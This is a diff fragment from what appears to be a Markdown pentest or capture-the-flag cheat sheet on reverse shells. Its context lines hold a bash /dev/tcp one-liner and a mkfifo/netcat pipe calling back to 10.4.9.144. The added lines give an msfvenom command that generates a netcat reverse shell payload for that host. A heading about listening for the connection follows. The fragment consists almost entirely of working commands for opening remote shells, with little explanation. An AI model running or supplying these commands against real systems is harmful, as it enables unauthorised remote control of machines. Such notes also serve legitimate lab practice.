@@ -185,6 +185,12 @@ bash -i >& /dev/tcp/10.4.9.144/1234 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.9.144 1234 >/tmp/f
 ```
 
+generate reverse shell payload using msfvenom
+
+```
+msfvenom -p cmd/unix/reverse_netcat lhost=10.4.9.144 lport=4444 R
+```
+
 ## listen for reverse shell
 
 on local machine
